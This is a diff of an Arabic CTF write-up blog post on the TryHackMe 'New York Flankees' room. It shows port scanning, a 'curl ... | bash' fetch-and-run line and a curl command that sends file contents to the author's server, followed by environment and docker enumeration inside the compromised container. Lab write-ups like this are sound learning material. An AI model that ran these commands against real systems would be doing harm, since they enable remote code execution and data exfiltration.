@@ -3,8 +3,8 @@ title: حل غرفة new york flankees
 date: 2024-07-15 7:00:00 -500
 description: تعال نفكر كيف نحل هذا التحدي
 image: https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1719465307426
-tags: [cyphers]
-categories: [CTF]
+tags: [Cryptography,Docker]
+categories: [THM_CTF]
 ---
 
 # المقدمة
@@ -13,7 +13,7 @@ categories: [CTF]
 
 ## فحص المداخل
 
-طبيعي في أي تحدي CTF أول شيء تسويه إنك تفحص المداخل عشان تاخذ نظرة عامة عن الصندوق (virtual mechine)، راح استخدم rustscan عشانه سريع، غالبا ماراح تستخدمه عل أهداف حقيقية عشان ماتبلع باند 
+طبيعي في أي تحدي CTF أول شيء تسويه إنك تفحص المداخل عشان تاخذ نظرة عامة عن الصندوق (virtual mechine)، راح استخدم rustscan عشانه سريع، غالبا ماراح تستخدمه على أهداف حقيقية عشان ماتبلع باند 
 
 ```bash
 ╭─ ඞ ~/thm ············································································
@@ -77,7 +77,7 @@ curl http://my_server/
 ```bash
 curl http://my_server/shell.sh | bash
 ```
-جاءت في بالي فكرة رهيبة، وهي إني أستخرج معلومات من السيرفر وأرسلها على السيرفر حقي باستخدام curl لكن أيضا بلا جدوى، سوي ملف تجريبي وجرب عليه الأمر التالي عشان تفهم فكرتي
+جاءت في بالي فكرة رهيبة، وهي إني أستخرج معلومات من السيرفر وأرسلها على السيرفر حقي باستخدام curl لكن أيضا بلا جدوى والسبب هو إني ما أعرف اسم أي ملف ، سوي ملف تجريبي وجرب عليه الأمر التالي عشان تفهم فكرتي
 
 ```bash
 cat secret.txt | xargs -I input curl http://my_server/input
@@ -87,7 +87,7 @@ cat secret.txt | xargs -I input curl http://my_server/input
 ╰─λ sudo python -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.6.29.36 - - [17/Jul/2024 23:42:38] code 404, message File not found
-10.6.29.36 - - [17/Jul/2024 23:42:38] "GET /yahabibiaglksecret HTTP/1.1" 404 -
+10.6.29.36 - - [17/Jul/2024 23:42:38] "GET /you_see?,secret HTTP/1.1" 404 -
 
 ```
 لكن بلا جدوى.
@@ -111,7 +111,6 @@ root
 بما إننا في docker container راح نجرب الأمر التالي ونشوف النتيجة
 ```bash
 root@02e849f307cc:/# env
-env
 HOSTNAME=02e849f307cc
 JAVA_HOME=/usr/local/openjdk-11
 PWD=/
@@ -129,10 +128,9 @@ CTF_PASSWORD=XXXXXXXXXX
 JAVA_VERSION=11.0.16
 _=/usr/bin/env
 ```
-ممتاز، باقي العلم الرابع وأروح أرقد، الصراحة ماعندي خلفية قوية عن "حاويات" دوكر لكن اللي أعرفه أن في بعض الأحيان يمديك تخرج منها، وهذا المطلوب منك يا عزيزي. نشوف إذا فيه حاويات ثانية
+ممتاز، باقي العلم الرابع وأروح أرقد، الصراحة ماعندي خلفية قوية عن "حاويات" دوكر لكن اللي أعرفه أن في بعض الأحيان يمديك تخرج منها، وهذا المطلوب منك يا عزيزي. خلينا نشوف إذا فيه حاويات ثانية
 ```bash
 root@02e849f307cc:/# docker ps
-docker ps
 CONTAINER ID   IMAGE                    COMMAND                  CREATED          STATUS          PORTS                                       NAMES
 02e849f307cc   padding-oracle-app_web   "java -jar /app/ktor…"   2 months ago     Up 51 minutes   0.0.0.0:8080->8080/tcp, :::8080->8080/tcp   padding-oracle-app_web_1
 ```
@@ -140,7 +138,6 @@ CONTAINER ID   IMAGE                    COMMAND                  CREATED        
 
 ```bash
 root@02e849f307cc:/# docker images
-docker images
 REPOSITORY               TAG       IMAGE ID       CREATED         SIZE
 padding-oracle-app_web   latest    cd6261dd9dda   2 months ago    1.01GB
 <none>                   <none>    4187efabd0a5   2 months ago    704MB
